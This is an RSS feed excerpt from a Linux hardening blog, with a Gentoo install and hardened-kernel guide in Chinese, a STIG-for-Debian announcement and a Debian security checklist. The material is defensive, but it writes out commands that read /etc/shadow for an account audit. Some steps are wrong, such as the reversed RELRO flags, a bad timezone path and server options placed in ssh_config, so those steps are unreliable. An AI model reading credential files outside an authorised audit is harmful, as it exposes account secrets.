&lt;h3 id=&quot;gentoo-1&quot;&gt;—-[ 3.2 Gentoo安装及编译&lt;/h3&gt;

&lt;p&gt;1）切换系统到/dev/sda3根分区上并更新系统环境变量：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mount -t proc none /mnt/gentoo/proc
mount -o bind /dev /mnt/gentoo/dev
mount -t sysfs sys /mnt/gentoo/sys
chroot /mnt/gentoo /bin/bash
env-update
&amp;gt;&amp;gt; Regenerating /etc/ld.so.cache...
source /etc/profile
export PS1=&quot;(chroot) $PS1&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2）设置时区：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cp /usr/share/Asia/Shanghai /etc/localtime
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3）设置主机名：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sed -i -e's/hostname.*/hostname=&quot;shenhua&quot;/' /etc/conf.d/hostname
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;4）修改镜像源 并且设置编译参数为8核编译(注意，编译参数在设置为核心数加1时理论上也可获得最优效果)：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/9452UEB.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;5）设置DNS(通常情况下设置默认dns即可，但此步缺失会造成dns无法解析，原因为chroot过程中dns信息未被转移)：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;echo &quot;nameserver 10.1.2.1&quot; &amp;gt;&amp;gt; /etc/resolv.conf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;6）安装内核源码：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;emerge gentoo-sources
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;7）安装自动编译内核工具genkernel：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;emerge genkernel
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;8）复制安装光盘的配置文件到genkernel搜索配置文件的默认位置(注意32位用户目录为/usr/share/arch/x8/,此配置文件livecd所使用的配置文件)：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;zcat /proc/config.gz &amp;gt; /usr/share/arch/x86_64/kernel-config
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;9）编译内核：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; genkernel all
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;10）修改fstab：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/Olr6tbb.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;11）配置网络：&lt;/p&gt;

&lt;p&gt;　（1）生成软连接(注意，eno1为网络接口名，不同电脑可能不同，请在chroot前用ifconfig命令确认)：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;   ln -s /etc/init.d/net.lo /etc/init.d/net.eno1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;　（2）创建网络配置文件：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; vi /etc/conf.d/net
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;　在空文件中写入(注意，如果是静态ip请采用静态配置)：
     # DHCP
     config_eno1=( “dhcp” )&lt;/p&gt;

&lt;p&gt;12）设置网卡开机自启动：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;rc-update add net.eno1 default
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;13）设置GRUB引导：&lt;/p&gt;

&lt;p&gt;(1) 修改配置文件：在etc/portage/make.conf中添加GRUB_PLATFORMS=”efi-64”(mbr引导可忽略此步骤)&lt;/p&gt;

&lt;p&gt;(2) 安装GRUB&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;emerge --ask sys-boot/grub:2
emerge -av sys-boot/os-prober
grub2-install --target=x86_64-efi
grub2-mkconfig -o /boot/grub2/grub.cfg
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;(3) 重起电脑，确认grub引导是否安装成功，如果成功再进行一下步骤&lt;/p&gt;

&lt;h3 id=&quot;section-1&quot;&gt;—-[ 3.3 软件环境安装&lt;/h3&gt;

&lt;p&gt;1）安装xrog：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; 在 /etc/portage/make.conf 中添加 INPUT_DEVICES=&quot;evdev synaptics&quot; 
 emerge --ask --verbose --pretend x11-base/xorg-drivers
 emerge --ask x11-base/xorg-server
 cat /etc/portage/package.use/._cfg0000_iputils &amp;gt; /etc/portage/package.use/iputils
 emerge twm
 emerge xclock
 emerge xterm
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;　　备注：twm xclock xterm原本是xrog软件包的一部分，在版本更新后从xrog中分离出来 需要单独安装&lt;/p&gt;

&lt;p&gt;2）编译kde桌面环境 
　　备注：编译其他环境 请参照wiki.gentoo.org openrc启动的kde对应的编号是6 其他桌面环境请自行更换&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;eselect profile list
eselect profile set 6
emerge --ask kde-apps/kdebase-meta
emerge --ask kde-base/kde4-l10n
在/etc/portage/make.conf中添加 LINGUAS=&quot;de&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;gentoo-2&quot;&gt;–[  4、Gentoo内核加固&lt;/h2&gt;

&lt;h3 id=&quot;section-2&quot;&gt;—-[ 4.1　加固选项设置&lt;/h3&gt;

&lt;p&gt;　　编辑/etc/ssh/ssh_config文件，在里面加入：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	# 1, known_hosts stores server's signature, so hash the host name:	
	HashKnownHosts yes
	#2, SSH protocl version 1 is not secure:
	Protocol 2
	#3, If you don't use X11 forwarding, plz disable it&quot;
	X11Forwarding no
	#4, Disable rhosts:
	IgnoreRhosts yes
	#5, Not allow empty password:
	PermitEmptyPasswords no
	#6, Maxisum tries:
	MaxAuthTries 5
	#7, Now allow root login:
	PermitRootLogin no
	#(Optional)
	#1, disable password auth, enable pubkey auth:
	PubkeyAuthentication yes
	PasswordAuthentication no
	#2，Allow or deny users/groups
	#AllowGroups, AllowUsers, DenyUsers, DenyGroups
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;　　根据自己的实际要求在改写最后一行 改为自己的用户组合用户名&lt;/p&gt;

&lt;h3 id=&quot;gentoo-hardened&quot;&gt;—-[ 4.2　编译gentoo hardened内核&lt;/h3&gt;

&lt;p&gt;1）下载加固内核源码&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;emerge --ask sys-kernel/hardened-sources
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2）配置加固内核 参照：&lt;/p&gt;

&lt;p&gt;　　&lt;a href=&quot;https://wiki.gentoo.org/wiki/Hardened/PaX_Quickstart#Building_a_PaX_Kernel&quot;&gt;https://wiki.gentoo.org/wiki/Hardened/PaX_Quickstart#Building_a_PaX_Kernel&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;　　&lt;a href=&quot;https://wiki.gentoo.org/wiki/Hardened/Grsecurity2_Quickstart&quot;&gt;https://wiki.gentoo.org/wiki/Hardened/Grsecurity2_Quickstart&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;3）编译&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ make
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;4）安装&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# make install
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;5）选择内核&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# eselect kernel list
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;6）重启使用新内核即可&lt;/p&gt;

</description>
        <pubDate>Tue, 23 Jun 2015 00:00:00 +0800</pubDate>
        <link>http://www.hardenedlinux.org/system-security/2015/06/23/Gentoo_system_install&kernal_harden.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2015/06/23/Gentoo_system_install&kernal_harden.html</guid>
        
        
        <category>system-security</category>
        
      </item>
    
      <item>
        <title>STIG-4-Debian</title>
        <description>&lt;p&gt;By:n3o4po11o&lt;/p&gt;

&lt;p&gt;Project: &lt;a href=&quot;https://github.com/hardenedlinux/STIG-4-Debian&quot;&gt;STIG-4-Debian&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;why-stig&quot;&gt;Why STIG?&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;http://iase.disa.mil/stigs/Pages/index.aspx&quot;&gt;STIGs&lt;/a&gt; is bring by a government agency called The Defense Information
System Agency(DISA), which is entity responsible for maintaining the security
posture of the Department of Defence(DoD) IT infrastructure. After we heard 
how the NSA fuck this world from Mr.Sn0wd3n.We will pay more attention about
how &lt;em&gt;they&lt;/em&gt; do the defense.&lt;/p&gt;

&lt;p&gt;DoD use this Security Technical Implementation Guides to All DoD IT assets before online/operations.&lt;/p&gt;

&lt;p&gt;And the STIGs classification system based on Mission Assurance Catagory (I-III)
and Confidentiality Level (Public-Classified), giving you 9 different possible 
combinations of config requirements.&lt;/p&gt;

&lt;h2 id=&quot;why-debian&quot;&gt;Why Debian?&lt;/h2&gt;

&lt;p&gt;In this scripts I’ve on Debian GNU/Linux 8, Debian has a lot security mechanism, and 
some good features, especially “ReproducibleBuilds”. I use the STIG for Red hat
6 v1r7 to porting STIG for Debian 8.&lt;/p&gt;

&lt;p&gt;Debian always has active maintenance, and has good security in default-configuration&lt;/p&gt;

&lt;h2 id=&quot;whats-different&quot;&gt;What’s different?&lt;/h2&gt;

&lt;p&gt;In STIG for RHEL-06, there’s some service doesn’t exist in debian, or some command or
some purpose implement in different way.&lt;/p&gt;

&lt;p&gt;You could find the porting-log in the repo &lt;a href=&quot;https://github.com/hardenedlinux/STIG-4-Debian&quot;&gt;STIG-4-Debian&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;But the general idea are all based on &lt;a href=&quot;http://iasecontent.disa.mil/stigs/zip/Apr2015/U_RedHat_6_V1R7_STIG.zip&quot;&gt;STIG For RHEL-06 v1r7&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;todo&quot;&gt;TODO&lt;/h2&gt;

&lt;p&gt;There’s a lot of TODO &lt;br /&gt;
Because this version I release just a simple “POC”, and just a pre-release version.
It doesn’t even cover all the “check”&lt;/p&gt;

&lt;p&gt;But I will release the first version of “full-check” version soon, and add Classification 
and Severity right after full-check, I think it will release in next month.&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;p&gt;[1]Difference between hardening guides (CIS, NSA, DISA)
http://security.stackexchange.com/questions/73164/difference-between-hardening-guides-cis-nsa-disa&lt;/p&gt;

&lt;p&gt;[2]What Are “STIGs” and How Do They Impact Your Overall Security Program?
http://www.seguetech.com/blog/2013/05/06/stigs-impact-overall-security-program&lt;/p&gt;

&lt;p&gt;[3]Beyond compliance: DISA STIGs’ role in cybersecurity
http://gcn.com/Articles/2015/05/14/DISA-STIG-compliance.aspx?Page=1&lt;/p&gt;

&lt;p&gt;[4]Security Technical Implementation Guides (STIGs)
http://iase.disa.mil/stigs/Pages/index.aspx&lt;/p&gt;

&lt;p&gt;[5]DISA RHEL 6 STIG V1 R7
http://iasecontent.disa.mil/stigs/zip/Apr2015/U_RedHat_6_V1R7_STIG.zip&lt;/p&gt;

&lt;p&gt;[6]Defense Information Systems Agency
https://en.wikipedia.org/wiki/Defense_Information_Systems_Agency&lt;/p&gt;

&lt;p&gt;[7]ReproducibleBuilds
https://wiki.debian.org/ReproducibleBuilds&lt;/p&gt;
</description>
        <pubDate>Fri, 19 Jun 2015 11:38:39 +0800</pubDate>
        <link>http://www.hardenedlinux.org/system-security/2015/06/19/STIG-4-Debian.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2015/06/19/STIG-4-Debian.html</guid>
        
        
        <category>system-security</category>
        
      </item>
    
      <item>
        <title>Debian GNU/Linux security checklist and hardening</title>
        <description>&lt;p&gt;project STIG-4-Debian will be soonn….&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/citypw/DNFWAH/master/5/d5_0x02_DNFWAH_debian_gnu-linux_security_chklist_hardening.txt&quot;&gt;Debian GNU/Linux security checklist and hardening&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;–[ CONTENTS&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;About this doc&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Security updates&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Vulnerability Assessment&lt;/p&gt;

    &lt;p&gt;2.1 GCC mitigation&lt;/p&gt;

    &lt;p&gt;2.2 0ld sch00l *nix file auditing&lt;/p&gt;

    &lt;p&gt;2.3 GNU/Linux’s auditd&lt;/p&gt;

    &lt;p&gt;2.4 T00ls&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Kernel security&lt;/p&gt;

    &lt;p&gt;3.1 Apparmor&lt;/p&gt;

    &lt;p&gt;3.2 SELinux&lt;/p&gt;

    &lt;p&gt;3.3 Mempo kernel&lt;/p&gt;

    &lt;pre&gt;&lt;code&gt;3.3.1 PaX\/Grsecurity
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;SSL/TLS Checklist&lt;/p&gt;

    &lt;p&gt;4.1 Ciphersuites in Apache2/Nginx&lt;/p&gt;

    &lt;p&gt;4.2 OpenSSH&lt;/p&gt;

    &lt;pre&gt;&lt;code&gt;4.2.1 OpenSSH in post-prism era
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Web security&lt;/p&gt;

    &lt;p&gt;5.1 Web server( Apache/Nginx?)&lt;/p&gt;

    &lt;p&gt;5.2 WAF( Web Application Firewall)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Security standard&lt;/p&gt;

    &lt;p&gt;6.1 STIGs for Debian&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Reference&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;about-this-documentation&quot;&gt;–[ 0. About this documentation&lt;/h2&gt;

&lt;p&gt;GNU/Linux already become one of most important fundamental element in
*modern* IT platform. Almost every important applications heavily rely
on the core component of GNU system: GCC, Glibc and linux
kernel. GNU/Linux is totally free/libre and open source software(
FLOSS). Many people thinks free/libre and open source software is
secure because its open to many eyes. Yes, that’s true. According to
&lt;a href=&quot;http://developers.slashdot.org/story/14/04/16/2021227/code-quality-open-source-vs-proprietary&quot;&gt;Coverity’s report&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The source code quality of FLOSS project are better than closed
software systems. But the FLOSS is not unbreakable. This documentation
is going to discuss something we should know about GNU/Linux security
operations. These examples in this doc has been tested only on Debian
GNU/Linux 7.5.&lt;/p&gt;

&lt;h2 id=&quot;security-update&quot;&gt;–[ 1. Security update&lt;/h2&gt;

&lt;p&gt;Follow the minimal installation principle: Debian is providing mini
installation iso.&lt;/p&gt;

&lt;p&gt;To check which packages need security updates:&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;#sudo apt-get upgrade -s&lt;/td&gt;
      &lt;td&gt;grep -i security&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;vulnerability-assessment&quot;&gt;–[ 2. Vulnerability Assessment&lt;/h2&gt;

&lt;p&gt;Know your GNU/Linux system as your *enemy* does. Your enmey might hide
in the shadow and watch and learn the ways you’ve been using the
system. As a defender, some philosophical ideas( thanks to Bruce
Schneier) should be &lt;a href=&quot;https://www.schneier.com/essays/archives/2000/04/the_process_of_secur.html&quot;&gt;kept in mind&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;p&gt;Security is NOT:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Security is NOT installing a firewall&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Security is NOT a Product or Service&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Security is Not a Product; It’s a Process&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Security is:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Security is a Process, Methodology, Costs, Policies and People&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Security is only as good as your “weakest link”&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Security is 24x7x365 … constantly ongoing .. never ending&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;p&gt;A security system is only as strong as its weakest
link. Defense-in-depth seems the only option we have. You should be
the best professional paranoia and also need a proper threat
model. “Who’s gonna attack your system” would be daily bread for your
mind;-)&lt;/p&gt;

&lt;p&gt;Those two articles are good examples of assessing GNU/Linux distros: &lt;a href=&quot;https://labs.mwrinfosecurity.com/blog/2010/06/29/assessing-the-tux-strength-part-1---userspace-memory-protection/&quot;&gt;Assessing I&lt;/a&gt;, &lt;a href=&quot;https://labs.mwrinfosecurity.com/blog/2010/09/02/assessing-the-tux-strength-part-2---into-the-kernel/&quot;&gt;Assessing II&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;“checksec.sh” is very useful tool from trapkit:&lt;/p&gt;
&lt;pre&gt;
#wget http://www.trapkit.de/tools/checksec.sh
&lt;/pre&gt;

&lt;p&gt;Be very careful with those binaries, which has suid( or sgid?) bit:&lt;/p&gt;
&lt;pre&gt;
#!/bin/bash

SETUID_PROGS=`find / -type f -perm -4000`

echo $SETUID_PROGS

for i in $SETUID_PROGS; do
        ./checksec.sh --file $i
done
&lt;/pre&gt;

&lt;h3 id=&quot;gcc-mitigation&quot;&gt;—-[ 2.1 GCC mitigation&lt;/h3&gt;

&lt;p&gt;setuid binaries are highly risks if the program had the bug that can
be exploitable.  The setuid binaries should be protected under GCC’s
mitigation.  We only examine &lt;a href=&quot;http://phrack.org/archives/issues/67/13.txt&quot;&gt;4 mitigation options here&lt;/a&gt; ( some GCC mitigation
description from one Phrack paper, thanks pi3..dude, did I owe you a
beer?)&lt;/p&gt;

&lt;p&gt;*) NX&lt;/p&gt;

&lt;p&gt;This feature can prevent shellcode execution on the stack.  This
mechanism can be implemented by hardware or software emulation.&lt;/p&gt;

&lt;p&gt;In GCC’s options, &lt;a href=&quot;http://en.wikipedia.org/wiki/NX_bit&quot;&gt;NX&lt;/a&gt; is enable by default. If you want to turn it off,
use “-z execstack”.&lt;/p&gt;

&lt;p&gt;Check method:&lt;/p&gt;
&lt;pre&gt;
shawn@shawn-fortress ~ $ readelf -l a.out | grep GNU_STACK 
  GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RW  0x8
&lt;/pre&gt;

&lt;p&gt;*) Stack canaries (canaries of the death)&lt;/p&gt;

&lt;p&gt;This is a compiler mechanism, in contrast to previously kernel-based
described techniques. When a function is called, the code inserted by
the compiler in its prologue stores a special value (the so-called
cookie) on the stack before the metadata. This value is a kind of
defender of sensitive data. During the epilogue the stack value is
compared with the original one and if they are not the same then a
memory corruption must have occurred. The program is then killed and
this situation is reported in the system logs. Details about technical
implementation and little arm race between protection and bypassing
protection in this area will be explained further.&lt;/p&gt;

&lt;p&gt;GCC options:
-fno-stack-protector,  do not add any canary onto any functions&lt;/p&gt;

&lt;p&gt;-fstack-protector, only add the canary onto a few functions in compile
 time&lt;/p&gt;

&lt;p&gt;-fstack-protector-all , add the canary onto all functions, be cautions
 about this one. It’d be triggered the heavily performance hit.&lt;/p&gt;

&lt;p&gt;-fstack-protector-strong, add the canary onto those functions, which
 the stack buffers would be used. This is a smart one. But its only
 supported by GCC 4.9.x. Kees Cook shared a very &lt;a href=&quot;http://www.outflux.net/blog/archives/2014/01/27/fstack-protector-strong/&quot;&gt;good writing here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Check the symbols in an elf file:&lt;/p&gt;
&lt;pre&gt;
#readelf -s ./a.out | grep stack_chk_fail 
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __stack_chk_fail@GLIBC_2.4 (3) 
    52: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __stack_chk_fail@@GLIBC_2 
&lt;/pre&gt;

&lt;p&gt;*) RELRO&lt;/p&gt;

&lt;p&gt;RELocation Read-Only.&lt;/p&gt;

&lt;p&gt;Turn it on: -z norelro 
Turn it off: -z now&lt;/p&gt;

&lt;p&gt;Check elf header to find partial-RELRO:&lt;/p&gt;
&lt;pre&gt;
shawn@shawn-fortress ~ $ readelf -l a.out | grep GNU_RELRO 
  GNU_RELRO      0x0000000000000e28 0x0000000000600e28 0x0000000000600e28 

Check elf's dynamic sections to find fully-RELRO: 
shawn@shawn-fortress ~ $ readelf -d a.out | grep BIND_NOW 
 0x0000000000000018 (BIND_NOW)
&lt;/pre&gt;

&lt;p&gt;*) PIE&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/Position-independent_code&quot;&gt;PIE&lt;/a&gt; enforces every process’s code segment is mmap()’d, it begins at a
different base address at each execution of the application.&lt;/p&gt;

&lt;p&gt;Note: mmap()’ is always used no matter what the type of the executable
is (PIE vs. non-PIE). For non-PIE binaries the kernel uses an internal
flag equivalent to MMAP_FIXED when mapping program headers.&lt;/p&gt;

&lt;p&gt;GCC option: -pie, it only work for sec mitigation when kernel enables
ASLR.&lt;/p&gt;
&lt;pre&gt;
no PIE: 
shawn@shawn-fortress ~ $ readelf -h a.out | grep &quot;Type:[[:space:]]*EXEC&quot; 
  Type:                              EXEC (Executable file) 

PIE: 
shawn@shawn-fortress ~ $ readelf -h a.out | grep &quot;Type:[[:space:]]*DYN&quot; 
  Type:                              DYN (Shared object file)
&lt;/pre&gt;

&lt;p&gt;These exploit mitigations provided by GCC will definitely increase the
cost of attackers. We all did believed so…until shit happened( as
always?). Hector Marco &lt;a href=&quot;http://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html&quot;&gt;released a method&lt;/a&gt; that can bypass NX/ASLR/PIE/CANARY mitigations locally/remotely
easily. After these years of debating and bragging about how secure of
GNU/Linux is/was and we finally ended up in*One mem infoleak can rule
the fuc*ing GNU/Linux*!!! Damn, PaX/Grsecurity will be our last hope
again, like a decade ago………..&lt;/p&gt;

&lt;h3 id=&quot;ld-sch00l-nix-file-auditing&quot;&gt;—-[ 2.2 0ld sch00l *nix file auditing&lt;/h3&gt;

&lt;p&gt;There are a bunch of files that could be exploited by attackers in the
specific scene. Fortunately, FOSS( Free &amp;amp; Open Source) community is
providing a lot of methods for the security audit work. They should be
a defender’s daily bread, which being part of defense-in-depth model.&lt;/p&gt;

&lt;p&gt;WildCards is a powerful feature in UNIX-like platform, but it can be
&lt;a href=&quot;http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt&quot;&gt;exploited&lt;/a&gt; by attackers:&lt;/p&gt;

&lt;pre&gt;find / -path /proc -prune  -name &quot;-*&quot;&lt;/pre&gt;

&lt;p&gt;World-writable file audit:&lt;/p&gt;

&lt;pre&gt;find / -path /proc -prune -o -perm -2 ! -type l -ls&lt;/pre&gt;

&lt;p&gt;World-readable file audit, correct permission: chmod 640 /var/log/:&lt;/p&gt;

&lt;pre&gt;find /var/log -perm -o=r ! -type l&lt;/pre&gt;

&lt;p&gt;Check if files were orphange:&lt;/p&gt;

&lt;pre&gt;find / -path /proc -prune -o -nouser -o -nogroup&lt;/pre&gt;

&lt;p&gt;List avaiable users, be cautions about who’s the “user”:&lt;/p&gt;
&lt;pre&gt;egrep -v '.*:\*|:\!' /etc/shadow | awk -F: '{print $1}'&lt;/pre&gt;

&lt;p&gt;Check which files belong to whom. Then delete the user correctly:&lt;/p&gt;

&lt;pre&gt;userdel -r account&lt;/pre&gt;

&lt;pre&gt;find / -path /proc -prune -o -user account -ls&lt;/pre&gt;

&lt;p&gt;List which users are unavailable:&lt;/p&gt;

&lt;pre&gt;grep -v ':x:' /etc/passwd&lt;/pre&gt;

&lt;p&gt;List expired passwords:&lt;/p&gt;

&lt;pre&gt;cat /etc/shadow | cut -d: -f 1,2 | grep '!'&lt;/pre&gt;

&lt;p&gt;The correct permission should be 644 at least. 600 would be better:&lt;/p&gt;

&lt;pre&gt;ls -l /boot&lt;/pre&gt;

&lt;p&gt;Files with suid or sgid flags:&lt;/p&gt;

&lt;pre&gt;find / -xdev -user root \( -perm -4000 -o -perm -2000 \)&lt;/pre&gt;

&lt;p&gt;Check if some stupid mistakes has been made( Thanks to Tim Brown):&lt;/p&gt;

&lt;pre&gt;objdump -x $i | grep -i path&lt;/pre&gt;

&lt;p&gt;Note: The main stream GNU/Linux distro( Debian, Gentoo, OpenSUSE,
CentOS) won’t have big chance to do stupid things, but it’s worth to
look at GNU/Linux platform with 3-rd party applications. Some
commercial applications may do something stuipid like this one:&lt;/p&gt;

&lt;p&gt;http://lists.openwall.net/bugtraq/2014/06/04/5&lt;/p&gt;

&lt;p&gt;—-[ 2.3 GNU/Linux’s auditd&lt;/p&gt;

&lt;p&gt;One particular scene is that some m41wares( or human attackers) might
be interested in change some file’s metadata for some *interesting*
reasons and then change it back to the original. Let’s show time:&lt;/p&gt;

&lt;p&gt;Install auditd and make sure its on boot startup:&lt;/p&gt;
&lt;pre&gt;#apt-get install auditd
#update-rc.d auditd enable&lt;/pre&gt;

&lt;p&gt;Config file:&lt;/p&gt;

&lt;pre&gt;/etc/audit/auditd.conf&lt;/pre&gt;

&lt;p&gt;Store log file:&lt;/p&gt;

&lt;pre&gt;log_file = /var/log/audit/audit.log&lt;/pre&gt;

&lt;p&gt;Add one policy to /etc/audit/audit.rules:&lt;/p&gt;

&lt;pre&gt;-w /home/shawn/change-test -p wa -k  identify&lt;/pre&gt;

&lt;p&gt;Use this test program to change the permission：&lt;/p&gt;

&lt;h1 id=&quot;include-stdioh&quot;&gt;include &amp;lt;stdio.h&amp;gt;&lt;/h1&gt;
&lt;p&gt;#include &amp;lt;sys/stat.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;&lt;/p&gt;

&lt;p&gt;int main(int argc, char *argv[])
{
	struct stat sb;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;if( stat(argv[1], &amp;amp;sb) == -1){
    perror(&quot;stat&quot;);
	exit(EXIT_FAILURE);
	}

	if( chmod(argv[1], sb.st_mode) == -1)
	{
		perror(&quot;stat&quot;);
			exit(EXIT_FAILURE);
			}
			return ; }
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;
shawn@shawn-fortress ~ $ gcc change.c
shawn@shawn-fortress ~ $ touch change-test
shawn@shawn-fortress ~ $ ./a.out change-test
&lt;/pre&gt;

&lt;p&gt;The date of  “Modify” and “Change” should be different:
shawn@shawn-fortress ~ $ stat change-test&lt;/p&gt;

&lt;p&gt;Check *who* did it:&lt;/p&gt;

&lt;p&gt;shawn@shawn-fortress ~ $ ausearch -i -k identify&lt;/p&gt;

&lt;h3 id=&quot;t00ls&quot;&gt;—-[ 2.4 T00ls&lt;/h3&gt;

&lt;p&gt;NMAP/OpenVAS/lynis/rkhunter/chkrootkit/metasploit/volatality/etc&lt;/p&gt;

&lt;p&gt;–[ 3. Kernel security&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Anti-DoS related:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;** SYN cookies is a syn flood attack protection, the default is enable( 1)：&lt;/p&gt;
&lt;pre&gt;
net.ipv4.tcp_syncookies = 1
/proc/sys/net/ipv4/tcp_syncookies

(optional)，if your kernel support SYNPROXY：
iptables -t raw -A PREROUTING -i eth0 -p tcp --dport 80 --syn -j NOTRACK
iptables -A INPUT -i eth0 -p tcp --dport 80 -m state UNTRACKED,INVALID \
	 -j SYNPROXY --sack-perm --timestamp --mss 1480 --wscale 7 --ecn

echo 0 &amp;gt; /proc/sys/net/netfilter/nf_conntrack_tcp_loose

Note: SYNPROXY has been added into vanilla kernel in 3.13.
&lt;/pre&gt;

&lt;p&gt;** TCP FIN-WAIT-2 status lifetime, it’d be an DoS attack risk if
the value is too big. It’d be cause remote machine doesn’t have enough
time to close the connection if the value is too small. Default is 60(
seconds). 15 is better, you think? &lt;a href=&quot;http://benohead.com/tcp-about-fin_wait_2-time_wait-and-close_wait/&quot;&gt;Further reading&lt;/a&gt;:&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_fin_timeout = 15
/proc/sys/net/ipv4/tcp_fin_timeout
&lt;/pre&gt;

&lt;p&gt;** SYN queue length, the bigger value can handle more connections, the
  default is 1024:&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_max_syn_backlog = 8192
/proc/sys/net/ipv4/tcp_max_syn_backlog
&lt;/pre&gt;

&lt;p&gt;** Device queue length, this value should be bigger than syn queue?
   The default is 1000&lt;/p&gt;

&lt;pre&gt;
net.core.netdev_max_backlog = 16384
/proc/sys/net/core/netdev_max_backlog
&lt;/pre&gt;

&lt;p&gt;** listen()’s backlog, the default is 128:&lt;/p&gt;

&lt;pre&gt;
net.core.somaxconn = 4096
/proc/sys/net/core/somaxconn
&lt;/pre&gt;

&lt;p&gt;** TIME_WAIT status TCP connections, the system will empty the
   connection if the number is exceed the value,&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_max_tw_buckets = 65535
/proc/sys/net/ipv4/tcp_max_tw_buckets
&lt;/pre&gt;

